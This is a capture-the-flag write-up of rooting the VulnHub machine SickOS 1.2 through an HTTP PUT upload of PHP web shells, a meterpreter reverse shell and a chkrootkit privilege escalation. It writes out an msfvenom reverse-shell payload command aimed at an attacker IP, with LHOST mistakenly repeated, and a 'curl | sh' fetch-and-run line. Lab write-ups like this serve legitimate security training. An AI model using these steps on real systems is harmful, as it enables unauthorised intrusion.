I will add here my methods to gain root level privileges on SickOS1.2.
After importing machine to my virtualization platform, I run arp-scan --localnet command to find out the ip address of the machine.
It seems our target's ip address is 192.168.146.174.
![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/4feb2abc-6121-4505-b471-69eab86fd073)
Hence I run a nmap scan to discover open ports and running services.
![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/20678f86-2d61-4a4a-bcb9-053d1b54407e)
 Port 22 and 80 is running on the target. Hence i run a nikto scan to get further data on the web application.
 ![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/bd586bdf-4c6d-472d-91ee-90cfa27e4ca0)

 Output shows us nikto found /test folder that might be interesting and server allows HTTP OPTIONS request that queries the supported methods by the server.
![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/88887a1f-1c32-46fa-a397-563cb1ac0b1b)

 It seems this is an directory indexing folder.
 to make sure about the finding I run burp and sent an HTTP OPTIONS request to target.
 ![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/dd0b1e3e-dda6-46c7-960d-a0d9d0ce9b6d)
 
That's correct, and server respond us with supported functions. HTTP PUT is allowd on the target.
 Let's try with curl to upload a newly created file.

![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/8d628804-48a6-4351-a887-dc82b598e630)

first time curl gave me error after a short google search, I needed to add an Expect header to my command.
And it worked!
![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/d75234d3-09ff-4a46-a972-6661e931167d)
 That means, we can upload our malicious webshells to target. I decided to use pentestmonkey's built int php reverse shell that 
 is located at /usr/share/webshells in Kali. I copied to my Desktop, renamed with reverse.php and edited the file with mousepad.(I added attacker IP address)
 ![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/f6718b22-fdee-44d6-a171-2d7edd519e97)
 then uploaded file with curl. After that started a netcat listener to catch incoming connection request on port 1234.
 ![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/9e954db2-ab2d-4ce9-bd98-d8a6cded0986)

I triggered the file but nothing happened.

![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/52619901-17f4-4f7d-bdd6-28d6346564ce)
 
 Also created another php payload with msfvenom on port 4444 didn't work as weel. Probably, a kind of firewall was  blocking server's reverse connection packet.
 Hence i decided to use php's shell_exec function to test whether running OS commands possible or not.
 i created a run.php file and uploaded to server . and it worked!

 ![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/94727201-06b1-46ad-bab7-f4304cf18a3b)

![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/fc138c58-66d3-43a4-a9a5-7a9f78cb089e)

![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/da50855c-87d1-436e-906f-e674bb44ca9b)

Hence I wrote a simple bash script to gain an interactive shell.(testnc.sh)

 ![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/45459a72-cb78-4f84-b14b-b919d38cc6b1)

 with the codes above, i aimed to run an interactive shell commands via my terminal over php shortly.
 ![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/64bed9ff-5d2c-49ec-9c4a-6567f52d9449)

 Hence i moved further and after spending too much time on it i wrote a permitted port detection script(runv1.sh)

![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/802c7fa5-a096-4dd0-bbd8-438d5e1aaee8)


with these codes, uploaded file will run "command" value on the target system. so target server will send me nc packets(-z) and if the target permits a spesific port, we'll learn it.
let's run it and see the result. After execution:
![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/594f35d6-4ce2-4d30-8ff5-ef34cefcfc3e)


result showed me, I can use port 443 and port 8080 to get reverse shell.
to use metasploit framework, i created a php payload with msfvenom.
#msfvenom -p /php/meterpreter/reverse_tcp LHOST=192.168.146.164 LHOST=443 -f raw -o meter.php
and uploaded with curl and started a multi handler listener.
![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/9031c6dc-d54e-4357-8fbf-6fb589d5a5f3)


![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/10718ea5-bb0d-46fc-9cd1-dca6771b5cff)

![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/74d344f2-da7c-459f-93cf-6b45100d48a1)
 now i'll run meter.php file via browser.
 
 ![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/d8e1ab2d-772b-4a37-bd89-90a80f714426)

then we've the session but we need to escalate our privileges.

![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/86a15ab1-e33b-4353-88ba-9b4666faebf0)

first i run metasploit's exploit suggester but nothing found, then i downloaded linepeas script and run on the target.
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
it gave lots of information about the local vulnerabilities and searched alot on all of them. also i tried dirty cow exploits but didn't work in my case.
linepeas outputed a chkrootkit vulnerability that is exist in metasploit and i used it. Remember, we had already an active meterpreter session.

![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/dea6ddc2-4bf6-471b-a744-9fed456a856f)


![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/c5e81087-ace7-4e75-a438-886b8d0e3e3a)

![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/1db4377c-ef92-4190-b0bb-3607e8be2fce)

finally we're root and let's read the flag and active rule.
![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/b0fec40f-6a4f-4ca5-88c2-e8b41d94b58b)

![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/000f74ed-fb53-4457-809c-c725f11afeea)

Thanks to @vulnhub and D4rk for this challenge.

